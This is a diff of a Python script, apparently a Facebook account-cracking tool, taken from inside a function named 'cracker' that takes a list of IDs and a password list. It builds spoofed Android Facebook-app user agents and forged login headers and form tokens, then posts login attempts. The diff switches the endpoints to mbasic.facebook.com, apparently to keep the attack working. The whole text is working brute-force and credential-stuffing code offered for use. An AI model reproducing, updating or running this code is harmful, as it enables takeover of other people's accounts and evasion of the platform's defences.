@@ -266,7 +266,7 @@ def cracker(ids,passlist):
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
+            url1 = "https://mbasic.facebook.com/"
             head = {"authority": "m.prod.facebook.com",
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -285,7 +285,7 @@ def cracker(ids,passlist):
             inner = {"server_params": {"credential_type": "password", "username_text_input_id": "x6kzs6:64", "password_text_input_id": "x6kzs6:65", "login_source": "Login", "login_credential_type": "none", "server_login_source": "login", "ar_event_source": "login_home_page", "should_trigger_override_login_success_action": 0, "should_trigger_override_login_2fa_action": 0, "is_caa_perf_enabled": 0, "reg_flow_source": "login_home_native_integration_point", "caller": "gslr", "two_step_login_type": "one_step_login", "access_flow_version": "pre_mt_behavior"}, "client_input_params": inner_client_input_params}
             params_field_value = json.dumps({"params": json.dumps(inner)})
             log_data = {"__aaid": "0", "__user": "0", "__a": "1", "__req": "9", "__hs": "20395.BP:wbloks_caa_pkg.2.0...0", "dpr": "3", "__ccg": "GOOD", "__rev": "1029294819", "__s": ":jjt0wz:2swfpv", "__hsi": "7568424016880344592", "__dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw", "fb_dtsg": "NAfvM4v_9svbdvrqMdCIaTWpnH92MnWGOaOQabm6EAozdWDdnMfSy0g:0:0", "jazoest": re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1), "lsd": re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1), "params": params_field_value}
-            url = "https://p.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=95c2f471fdc717a6b79ae75e26e90a643f5613e03d463667d5b99baf34570f30"
+            url = "https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=95c2f471fdc717a6b79ae75e26e90a643f5613e03d463667d5b99baf34570f30"
             headers = {"authority": "p.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
@@ -296,8 +296,8 @@ def cracker(ids,passlist):
             "cache-control": "max-age=0",
             "content-type": "application/x-www-form-urlencoded",
             "dpr": "3",
-            "origin": "https://p.facebook.com",
-            "referer": "https://p.facebook.com/ig/login_via/app/?lid=126HyGChXuF5b90G3&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHncrMvS9D4hZNBQEi6NQddVz9mJBhfT7WZPzt2hC0M2ymDn%2BMtJJ%2FhLzFoOrM709kw%2Fj9FAFN51HlbmgNmdeH8F9DZOctUUp2pXU7pdXdT3rQM%2BtOxOfPSLsiVM6dpTkttuA%3D%3D",
+            "origin": "https://mbasic.facebook.com",
+            "referer": "https://mbasic.facebook.com/ig/login_via/app/?lid=126HyGChXuF5b90G3&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHncrMvS9D4hZNBQEi6NQddVz9mJBhfT7WZPzt2hC0M2ymDn%2BMtJJ%2FhLzFoOrM709kw%2Fj9FAFN51HlbmgNmdeH8F9DZOctUUp2pXU7pdXdT3rQM%2BtOxOfPSLsiVM6dpTkttuA%3D%3D",
             "sec-ch-prefers-color-scheme": "light",
             "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
             "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
